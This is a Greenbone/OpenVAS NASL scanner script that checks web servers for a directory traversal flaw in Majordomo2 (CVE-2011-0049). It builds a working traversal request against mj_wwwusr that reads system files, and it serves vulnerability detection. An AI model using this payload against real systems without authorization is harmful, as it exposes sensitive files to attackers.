# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801838");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
  script_cve_id("CVE-2011-0049", "CVE-2011-0063");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Majordomo2 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisory/View/1");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46127");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16103/");
  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=628064");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.");

  script_tag(name:"affected", value:"Majordomo2 Build 20110203 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
  'help' parameter in 'mj_wwwusr', which allows attacker to read arbitrary
  files via directory traversal attacks.");

  script_tag(name:"solution", value:"Upgrade to Majordomo2 Build 20110204 or later.");

  script_tag(name:"summary", value:"Majordomo2 is prone to a directory traversal vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

files = traversal_files();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  res = http_get_cache( item:dir + "/mj_wwwusr", port:port );

  if( '>Majordomo' >< res ) {

    foreach file( keys( files ) ) {

      url = dir + "/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../" +
                  "../../../../../../" + files[file];

      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
